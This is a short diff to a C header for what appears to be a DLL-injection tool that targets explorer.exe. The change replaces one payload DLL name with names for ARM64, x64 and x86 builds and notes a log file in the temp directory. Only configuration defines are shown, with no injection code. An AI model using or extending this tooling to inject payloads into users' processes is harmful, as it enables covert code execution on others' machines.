@@ -3,8 +3,19 @@
 // Target process name for injection
 #define TARGET_PROCESS "explorer.exe"
 
-// Payload DLL name
-#define PAYLOAD_DLL_NAME "payload.dll"
+// Payload DLL name (selected by build target architecture)
+#if defined(_M_ARM64)
+    #define PAYLOAD_DLL_NAME "payload_arm64.dll"
+    #define BUILD_ARCH_NAME  "ARM64"
+#elif defined(_M_X64) || defined(_M_AMD64)
+    #define PAYLOAD_DLL_NAME "payload_x64.dll"
+    #define BUILD_ARCH_NAME  "x64"
+#elif defined(_M_IX86)
+    #define PAYLOAD_DLL_NAME "payload_x86.dll"
+    #define BUILD_ARCH_NAME  "x86"
+#else
+    #error "Unsupported architecture. Build for x86, x64, or ARM64."
+#endif
 
 // Log file name (will be placed in user's temp directory)
 // The actual path is constructed dynamically using GetTempPathA()
